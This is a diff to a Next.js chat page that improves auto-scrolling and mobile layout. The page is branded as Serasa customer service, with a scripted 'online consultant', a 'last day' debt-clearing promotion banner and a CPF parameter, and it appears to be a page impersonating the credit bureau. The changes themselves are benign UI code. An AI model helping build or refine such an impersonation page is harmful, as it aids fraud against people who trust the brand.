@@ -1,6 +1,6 @@
 "use client"
 
-import { Suspense, useState, useEffect, useRef } from "react"
+import { Suspense, useState, useEffect, useRef, useCallback } from "react"
 import { useSearchParams } from "next/navigation"
 import Image from "next/image"
 import { Card } from "@/components/ui/card"
@@ -377,26 +377,95 @@ function ChatContent() {
   const [clickedButtons, setClickedButtons] = useState<Set<string>>(new Set())
   const [isMounted, setIsMounted] = useState(false)
   const messagesEndRef = useRef<HTMLDivElement>(null)
+  const chatContainerRef = useRef<HTMLDivElement>(null)
   const isInitializedRef = useRef(false)
   const hasStartedConversationRef = useRef(false)
   const queuedMessageIdsRef = useRef<Set<string>>(new Set())
   const activeTimeoutsRef = useRef<NodeJS.Timeout[]>([])
 
-  const scrollToBottom = () => {
-    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" })
-  }
+  const scrollToBottom = useCallback((behavior: ScrollBehavior = "smooth") => {
+    if (chatContainerRef.current) {
+      chatContainerRef.current.scrollTo({
+        top: chatContainerRef.current.scrollHeight,
+        behavior,
+      })
+    }
+
+    if (messagesEndRef.current) {
+      try {
+        messagesEndRef.current.scrollIntoView({
+          behavior,
+          block: "end",
+          inline: "nearest",
+        })
+      } catch {
+        messagesEndRef.current.scrollIntoView(false)
+      }
+    }
+
+    if (typeof window !== "undefined") {
+      const docHeight = Math.max(
+        document.documentElement.scrollHeight,
+        document.body.scrollHeight
+      )
+      window.scrollTo({
+        top: docHeight,
+        behavior,
+      })
+    }
+  }, [])
 
   useEffect(() => {
     setIsMounted(true)
+
+    const originalOverflow = document.body.style.overflow
+    const originalOverscroll = document.body.style.overscrollBehavior
+    document.body.style.overflow = "hidden"
+    document.body.style.overscrollBehavior = "none"
+
     return () => {
+      document.body.style.overflow = originalOverflow
+      document.body.style.overscrollBehavior = originalOverscroll
       activeTimeoutsRef.current.forEach(clearTimeout)
       activeTimeoutsRef.current = []
     }
   }, [])
 
   useEffect(() => {
-    scrollToBottom()
-  }, [messages])
+    scrollToBottom("smooth")
+
+    const t1 = setTimeout(() => scrollToBottom("smooth"), 80)
+    const t2 = setTimeout(() => scrollToBottom("smooth"), 250)
+    const t3 = setTimeout(() => scrollToBottom("smooth"), 500)
+    const t4 = setTimeout(() => scrollToBottom("smooth"), 900)
+
+    return () => {
+      clearTimeout(t1)
+      clearTimeout(t2)
+      clearTimeout(t3)
+      clearTimeout(t4)
+    }
+  }, [messages, isTyping, scrollToBottom])
+
+  useEffect(() => {
+    const container = chatContainerRef.current
+    if (!container || typeof ResizeObserver === "undefined") return
+
+    let resizeTimer: NodeJS.Timeout
+    const observer = new ResizeObserver(() => {
+      clearTimeout(resizeTimer)
+      resizeTimer = setTimeout(() => {
+        scrollToBottom("smooth")
+      }, 60)
+    })
+
+    observer.observe(container)
+
+    return () => {
+      observer.disconnect()
+      clearTimeout(resizeTimer)
+    }
+  }, [scrollToBottom])
 
   useEffect(() => {
     if (!cpf) return
@@ -1122,43 +1191,54 @@ function ChatContent() {
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-pink-50 to-white">
-      <div className="sticky top-0 z-50 bg-pink-600 text-white p-4 shadow-lg">
+    <div className="fixed inset-0 h-[100dvh] flex flex-col bg-gradient-to-br from-pink-50 to-white overflow-hidden">
+      {/* Header Fixo no Topo */}
+      <header className="flex-shrink-0 z-50 bg-pink-600 text-white px-4 pt-[max(0.75rem,env(safe-area-inset-top))] pb-3 sm:py-4 shadow-md select-none">
         <div className="max-w-4xl mx-auto flex items-center gap-3">
           <Image
             src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
             alt="Serasa"
             width={120}
             height={40}
-            className="h-8 w-auto"
+            className="h-7 sm:h-8 w-auto object-contain"
+            priority
           />
-          <div className="flex-1">
-            <h1 className="font-semibold text-lg">Atendimento Serasa</h1>
-            <p className="text-sm opacity-90 flex items-center gap-2">
-              <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
+          <div className="flex-1 min-w-0">
+            <h1 className="font-semibold text-base sm:text-lg leading-tight truncate">Atendimento Serasa</h1>
+            <p className="text-xs sm:text-sm opacity-90 flex items-center gap-1.5 leading-tight truncate">
+              <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse flex-shrink-0"></span>
               Renata - Consultora Online
             </p>
           </div>
-          <div className="flex items-center gap-2">
+          <div className="flex items-center gap-2 flex-shrink-0">
             <div className="text-right hidden sm:block">
               <p className="text-xs opacity-75">Feirao Limpa Nome</p>
               <p className="text-xs font-semibold">Ultimo dia!</p>
             </div>
-            <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center">
+            <div className="w-9 h-9 sm:w-10 sm:h-10 bg-white/20 rounded-full flex items-center justify-center overflow-hidden">
               <Image
                 src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/unnamed-mc1cq9oGl94BkoUSXsitt93EG7m1IA.png"
                 alt="Atendente"
                 width={36}
                 height={36}
-                className="w-9 h-9 rounded-full"
+                className="w-8 h-8 sm:w-9 sm:h-9 rounded-full object-cover"
               />
             </div>
           </div>
         </div>
-      </div>
+      </header>
 
-      <div className="max-w-4xl mx-auto bg-white/80 backdrop-blur-sm min-h-[calc(100vh-80px)] relative shadow-xl">
-        <div className="p-4 space-y-4 pb-20">
+      {/* Area Rolavel de Mensagens com scroll nativo e suave */}
+      <main
+        ref={chatContainerRef}
+        className="flex-1 overflow-y-auto overflow-x-hidden relative overscroll-y-contain"
+        style={{
+          WebkitOverflowScrolling: "touch",
+          scrollBehavior: "smooth",
+        }}
+      >
+        <div className="max-w-4xl mx-auto bg-white/80 backdrop-blur-sm min-h-full relative shadow-xl">
+          <div className="p-3.5 sm:p-4 space-y-4 pb-[max(5rem,calc(env(safe-area-inset-bottom)+4rem))]">
           {isLoading && (
             <div className="flex justify-center py-8">
               <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-pink-600"></div>
@@ -1207,6 +1287,7 @@ function ChatContent() {
                               width={300}
                               height={200}
                               className="rounded-lg w-full"
+                              onLoad={() => scrollToBottom("smooth")}
                             />
                           </div>
                         )}
@@ -1536,9 +1617,10 @@ function ChatContent() {
             </div>
           )}
 
-          <div ref={messagesEndRef} />
+            <div ref={messagesEndRef} className="h-6 w-full" />
+          </div>
         </div>
-      </div>
+      </main>
     </div>
   )
 }
